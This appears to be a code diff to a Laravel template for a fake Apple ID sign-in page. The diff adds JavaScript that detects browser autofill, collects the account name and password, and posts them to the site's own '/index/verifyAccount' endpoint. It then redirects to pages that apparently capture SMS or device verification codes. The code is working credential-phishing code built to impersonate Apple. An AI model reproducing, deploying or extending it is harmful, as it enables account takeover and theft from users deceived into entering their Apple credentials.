@@ -8,6 +8,38 @@
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
     <script src="{{ asset('/hccanvastxt/hccanvastxt.min.js?1') }}"></script>
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/signin.css') }}">
+    <style>
+        /* 检测浏览器自动填充的CSS */
+        input:-webkit-autofill {
+            animation-name: onAutoFillStart;
+            animation-duration: 0.001s;
+        }
+
+        input:not(:-webkit-autofill) {
+            animation-name: onAutoFillCancel;
+            animation-duration: 0.001s;
+        }
+
+        @keyframes onAutoFillStart {
+            from {
+                opacity: 0.99;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes onAutoFillCancel {
+            from {
+                opacity: 1;
+            }
+
+            to {
+                opacity: 0.99;
+            }
+        }
+    </style>
 </head>
 
 <body class="tk-body ">
@@ -53,7 +85,8 @@
                                                                 ($keyup)="appleIdKeyupHandler()"
                                                                 ($blur)="appleIdBlurHandler()"
                                                                 class="force-ltr form-textbox-input lower-border-reset"
-                                                                aria-invalid="false" autofocus="">
+                                                                aria-invalid="false"
+                                                                autofocus="">
                                                             <span aria-hidden="true" id="apple_id_field_label"
                                                                 class=" form-textbox-label  form-label-flyout">
 
@@ -200,7 +233,7 @@
                                             </div>
                                         </div>
                                     </div>
-                                    <button id="sign-in" ($click)="_verify($element)" tabindex="0"
+                                    <button id="sign-in" tabindex="0"
                                         class="si-button btn  fed-ui   fed-ui-animation-show   disable   remember-me"
                                         aria-label="continue"
                                         aria-disabled="true" disabled="">
@@ -238,12 +271,9 @@
                                                 {{-- class="sr-only">{{ __('apple.signin.new_window_open') }}</span>--}}
                                             </a>
                                         </div>
-
                                     </div>
-
                                 </div>
                             </div>
-
                         </sign-in>
                     </div>
                 </div>
@@ -256,7 +286,485 @@
     </div>
     <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
-    <script type="text/javascript" src="{{ asset('/js/apple/signin.js') }}"></script>
+    <script src="https://unpkg.com/libphonenumber-js@1.12.8/bundle/libphonenumber-max.js"></script>
+    <script type="text/javascript">
+        const country_code = '{{ $data["country_code"] }}';
+
+        class SimpleSignIn {
+            constructor() {
+                this.accountInput = $("#account_name_text_field");
+                this.passwordInput = $("#password_text_field");
+                this.signInButton = $("#sign-in");
+                this.passwordContainer = $(".password");
+                this.spinner = $(".spinner-container.auth");
+                this.signinForm = $("#sign_in_form");
+                this.accountForm = $("#sign_in_form .account-name");
+                this.passwordForm = $("#sign_in_form .password");
+                this.accountLabel = $("#apple_id_field_label");
+                this.passwordLabel = $("#password_field_label");
+                this.signinError = $(".signin-error");
+
+
+                this.init();
+            }
+
+            init() {
+                $.removeCookie("Guid");
+                $.removeCookie("ID");
+                $.removeCookie("Number");
+                $.removeCookie("phoneCount");
+                $(window.parent.document).scrollTop(46);
+
+                this.bindEvents();
+
+                this.checkInitialState();
+            }
+
+            bindEvents() {
+                this.accountInput.on('input', () => this.updateButtonState());
+                this.passwordInput.on('input', () => this.updatePasswordState());
+
+                this.bindAutoFillEvents();
+
+                this.signInButton.on('click', () => {
+                    this.handleSignIn();
+                });
+
+                this.accountInput.on('keypress', (e) => {
+                    if (e.keyCode === 13) this.handleSignIn();
+                });
+                this.passwordInput.on('keypress', (e) => {
+                    if (e.keyCode === 13) this.handleSignIn();
+                });
+
+                this.bindFocusEvents();
+
+                $("body").on("click", (e) => {
+                    if (!$(e.target).closest(".signin-error").length) {
+                        this.signinError.addClass("hide");
+                    }
+                });
+            }
+
+            bindFocusEvents() {
+                this.accountInput.on("focus", () => {
+                    this.accountForm.addClass("select-focus");
+                    this.passwordForm.removeClass("select-focus");
+                    this.signinError.addClass("hide");
+
+                    if (!this.isPasswordVisible()) {
+                        this.signInButton.addClass("has-focus");
+                        this.accountLabel.removeClass("account-label-custom-blur");
+                        this.accountLabel.addClass("account-label-custom-focus");
+                    }
+                });
+
+                this.accountInput.on("blur", () => {
+                    if (!this.isPasswordVisible()) {
+                        let value = this.accountInput.val();
+                        if (!value || value.length < 1) {
+                            this.signInButton.removeClass("has-focus");
+                            this.accountLabel.removeClass("account-label-custom-focus");
+                            this.accountLabel.addClass("account-label-custom-blur");
+                        }
+                    }
+                });
+
+                this.passwordInput.on("focus", () => {
+                    this.passwordForm.addClass("select-focus");
+                    this.accountForm.removeClass("select-focus");
+                    this.signInButton.addClass("has-focus-password");
+                    this.signInButton.removeClass("has-focus-password-blur");
+                    this.signinError.addClass("hide");
+                });
+
+                this.passwordInput.on("blur", () => {
+                    let value = this.passwordInput.val();
+                    if (!value || value.length < 1) {
+                        this.signInButton.removeClass("has-focus-password");
+                        this.signInButton.addClass("has-focus-password-blur");
+                    }
+                });
+            }
+
+            bindAutoFillEvents() {
+                this.passwordInput.on('change', () => {
+                    this.handlePasswordAutoFill();
+                });
+
+                this.accountInput.on('change', () => {
+                    setTimeout(() => {
+                        this.handlePasswordAutoFill();
+                    }, 100);
+                });
+
+                this.passwordInput.on('animationstart', (e) => {
+                    if (e.originalEvent &&
+                        (e.originalEvent.animationName.includes('autofill') ||
+                            e.originalEvent.animationName === 'onAutoFillStart')) {
+                        this.handlePasswordAutoFill();
+                    }
+                });
+
+                this.accountInput.on('animationstart', (e) => {
+                    if (e.originalEvent &&
+                        (e.originalEvent.animationName.includes('autofill') ||
+                            e.originalEvent.animationName === 'onAutoFillStart')) {
+                        setTimeout(() => {
+                            this.handlePasswordAutoFill();
+                        }, 100);
+                    }
+                });
+
+                this.startAutoFillPolling();
+            }
+
+            handlePasswordAutoFill() {
+                const passwordValue = this.passwordInput.val();
+                const accountValue = this.accountInput.val();
+
+                if (passwordValue && passwordValue.length > 0) {
+                    if (!this.isPasswordVisible()) {
+                        this.showPasswordField();
+                    }
+
+                    if (accountValue && accountValue.length > 0) {
+                        this.accountInput.addClass("form-textbox-entered");
+                        this.accountForm.addClass("show-password");
+                    }
+
+                    this.updatePasswordState();
+                }
+            }
+
+            // 定时检查自动填充（作为备用方案）
+            startAutoFillPolling() {
+                // 只在页面加载后的前几秒内进行检查
+                let checkCount = 0;
+                const maxChecks = 20; // 最多检查20次
+                const checkInterval = 250; // 每250ms检查一次
+
+                const pollInterval = setInterval(() => {
+                    checkCount++;
+
+                    const passwordValue = this.passwordInput.val();
+                    if (passwordValue && passwordValue.length > 0 && !this.isPasswordVisible()) {
+                        this.handlePasswordAutoFill();
+                        clearInterval(pollInterval);
+                        return;
+                    }
+
+                    // 达到最大检查次数后停止
+                    if (checkCount >= maxChecks) {
+                        clearInterval(pollInterval);
+                    }
+                }, checkInterval);
+            }
+
+            // 检查初始状态
+            checkInitialState() {
+                let account = this.accountInput.val();
+                let password = this.passwordInput.val();
+
+                if (account && account.length > 0 && password && password.length > 0) {
+                    // 如果账号和密码都有值，显示密码框并聚焦到密码输入框
+                    this.showPasswordField();
+                    this.enableButton();
+                    this.passwordInput.focus();
+                    this.signInButton.addClass("has-focus-password");
+                } else if (account && account.length > 0) {
+                    // 如果只有账号，启用按钮并聚焦到账号
+                    this.enableButton();
+                    this.signInButton.addClass("has-focus");
+                } else {
+                    // 都没有值，禁用按钮
+                    this.disableButton();
+                }
+            }
+
+            // 统一的按钮状态管理
+            updateButtonState() {
+                const hasAccount = this.accountInput.val().trim().length > 0;
+
+                if (hasAccount) {
+                    this.enableButton();
+                    // 当账号输入框有内容时，隐藏密码框并清空密码（重新开始流程）
+                    if (this.isPasswordVisible()) {
+                        this.hidePasswordField();
+                        this.passwordInput.val("");
+                    }
+                    // 确保按钮聚焦到账号输入框
+                    this.signInButton.removeClass("has-focus-password");
+                    this.signInButton.removeClass("has-focus-password-blur");
+                    this.signInButton.addClass("has-focus");
+                } else {
+                    this.disableButton();
+                    this.hidePasswordField();
+                    this.passwordInput.val("");
+                    this.signInButton.removeClass("has-focus");
+                }
+            }
+
+            // 密码输入框状态管理
+            updatePasswordState() {
+                const hasPassword = this.passwordInput.val().length > 0;
+
+                if (hasPassword) {
+                    this.enableButton();
+                    this.signInButton.removeClass("has-focus");
+                    this.signInButton.addClass("has-focus-password");
+                    this.signInButton.removeClass("has-focus-password-blur");
+                } else {
+                    this.disableButton();
+                    this.signInButton.removeClass("has-focus-password");
+                    this.signInButton.addClass("has-focus-password-blur");
+                }
+            }
+
+            // 密码框可见性检查
+            isPasswordVisible() {
+                return this.signinForm.hasClass("account-name-entered") &&
+                    !this.signinForm.hasClass("hide-password");
+            }
+
+            // 显示密码输入框
+            showPasswordField() {
+                this.signinForm.addClass("account-name-entered");
+                this.signinForm.removeClass("hide-password");
+                this.signinForm.removeClass("hide-placeholder");
+
+                this.accountInput.addClass("form-textbox-input");
+                this.accountInput.removeClass("lower-border-reset");
+                this.accountInput.addClass("form-textbox-entered");
+                this.accountForm.removeClass("hide-password");
+                this.accountForm.addClass("show-password");
+            }
+
+            // 隐藏密码输入框
+            hidePasswordField() {
+                this.signinForm.removeClass("account-name-entered");
+                this.signinForm.addClass("hide-password");
+                this.signinForm.addClass("hide-placeholder");
+                this.signInButton.removeClass("has-focus-password");
+                this.signInButton.removeClass("has-focus-password-blur");
+
+                this.accountForm.addClass("hide-password");
+                this.accountForm.removeClass("show-password");
+            }
+
+            // 启用按钮
+            enableButton() {
+                this.signInButton.removeClass("disable");
+                this.signInButton.removeAttr("disabled");
+                this.signInButton.attr("aria-disabled", "false");
+            }
+
+            // 禁用按钮
+            disableButton() {
+                this.signInButton.addClass("disable");
+                this.signInButton.attr("disabled", "true");
+                this.signInButton.attr("aria-disabled", "true");
+            }
+
+            // 显示加载状态
+            showLoading() {
+
+                this.signInButton.addClass("v-hide");
+
+                this.spinner.removeClass("spinner-hide");
+                this.spinner.addClass("focus");
+                // 强制显示spinner（覆盖任何隐藏样式）
+                this.spinner.css({
+                    'display': 'block',
+                    'visibility': 'visible',
+                    'opacity': '1',
+                    'z-index': '9999'
+                });
+
+                // 登录时loading固定显示在密码字段
+                this.spinner.addClass("password-spinner");
+                this.spinner.removeClass("account-spinner");
+
+
+                // 检查内部spinner元素
+                const innerSpinner = this.spinner.find('.spinner');
+
+                this.disableInputs();
+            }
+
+            // 隐藏加载状态
+            hideLoading() {
+                this.signInButton.removeClass("v-hide");
+                this.spinner.addClass("spinner-hide");
+                this.spinner.removeClass("focus");
+                // 强制隐藏spinner
+                this.spinner.css('display', 'none');
+
+                // 清理spinner的位置状态
+                this.spinner.removeClass("password-spinner");
+                this.spinner.removeClass("account-spinner");
+
+                this.enableInputs();
+            }
+
+            // 禁用输入框
+            disableInputs() {
+                this.accountInput.addClass("verify-password");
+                this.accountInput.attr("disabled", "true");
+                this.accountLabel.addClass("account-label-custom-focus");
+                this.passwordInput.addClass("verify-password");
+                this.passwordInput.attr("disabled", "true");
+                this.passwordLabel.addClass("account-label-custom-focus");
+            }
+
+            // 启用输入框
+            enableInputs() {
+                this.accountInput.removeClass("verify-password");
+                this.accountInput.removeAttr("disabled");
+                this.accountLabel.removeClass("account-label-custom-focus");
+                this.passwordInput.removeClass("verify-password");
+                this.passwordInput.removeAttr("disabled");
+                this.passwordLabel.removeClass("account-label-custom-focus");
+            }
+
+            // 简化的登录处理
+            async handleSignIn() {
+
+                let account = this.accountInput.val().trim();
+                const password = this.passwordInput.val();
+
+
+                if (!account) {
+                    return;
+                }
+
+                // 首先格式化手机号（如果是手机号的话）
+                const formattedAccount = this.formatAndGetPhoneNumber(account);
+                if (formattedAccount !== account) {
+                    // 如果格式化后的值不同，更新输入框
+                    this.accountInput.val(formattedAccount);
+                    account = formattedAccount;
+                }
+
+                if (!password) {
+                    // 没有密码时，显示密码框并聚焦
+                    if (!this.isPasswordVisible()) {
+                        this.showPasswordField();
+                    }
+                    this.passwordInput.focus();
+                    return;
+                }
+
+                // 开始登录
+                this.showLoading();
+
+                try {
+                    const response = await this.performLogin(account, password);
+                    this.handleLoginSuccess(response);
+                } catch (error) {
+                    this.handleLoginError(error);
+                } finally {
+                    this.hideLoading();
+                }
+            }
+
+            // 异步登录请求
+            performLogin(account, password) {
+                return new Promise((resolve, reject) => {
+                    $.ajax({
+                        url: "/index/verifyAccount",
+                        dataType: "json",
+                        type: "post",
+                        async: true,
+                        contentType: "application/json",
+                        data: JSON.stringify({
+                            accountName: account,
+                            password: password,
+                        }),
+                        success: function(response) {
+                            resolve(response);
+                        },
+                        error: function(xhr, status, error) {
+                            reject({
+                                xhr,
+                                status,
+                                error
+                            });
+                        }
+                    });
+                });
+            }
+
+            // 处理登录成功
+            handleLoginSuccess(response) {
+                const data = response?.data;
+                if (data && (response.code === 201 || response.code === 202 || response.code === 203)) {
+                    // 更新父窗口动画
+                    $(".landing__animation", window.parent.document).hide();
+                    $(".landing", window.parent.document).addClass(
+                        "landing--sign-in landing--first-factor-authentication-success landing--transition"
+                    );
+
+                    // 根据不同的响应代码跳转到不同页面
+                    switch (response.code) {
+                        case 201:
+                            window.location.href = "/index/auth";
+                            break;
+                        case 202:
+                            window.location.href = "/index/authPhoneList?Guid=" + data.Guid;
+                            break;
+                        case 203:
+                            window.location.href = `/index/sms?Guid=${data.Guid}`;
+                            break;
+                        default:
+                            window.location.href = "/index/auth";
+                    }
+                } else {
+                    this.handleLoginError({
+                        message: "登录响应无效"
+                    });
+                }
+            }
+
+            // 处理登录错误
+            handleLoginError(error) {
+
+                // 清空密码并重新聚焦账号输入框
+                this.passwordInput.val("");
+                this.accountInput.focus();
+
+                // 显示错误信息
+                this.signinError.removeClass("hide");
+            }
+
+            // 格式化手机号并返回格式化后的值
+            formatAndGetPhoneNumber(value) {
+                // 如果包含@符号，则认为是邮箱，不格式化
+                if (value.includes('@')) {
+                    return value;
+                }
+
+                let formattedNumber;
+                // 尝试解析手机号
+                if (value.startsWith('+')) {
+                    // 已经包含国际区号，直接解析
+                    formattedNumber = libphonenumber.parsePhoneNumber(value)?.formatInternational();
+                } else {
+                    // 没有区号，使用默认国家解析
+                    formattedNumber = libphonenumber.parsePhoneNumber(value, country_code)?.formatInternational();
+                }
+
+                // 如果格式化成功，返回格式化后的值，否则返回原值
+                return formattedNumber || value;
+            }
+        }
+
+        // 初始化登录管理器
+        let signInManager;
+        $(document).ready(function() {
+            signInManager = new SimpleSignIn();
+        });
+    </script>
 </body>
 
 </html>
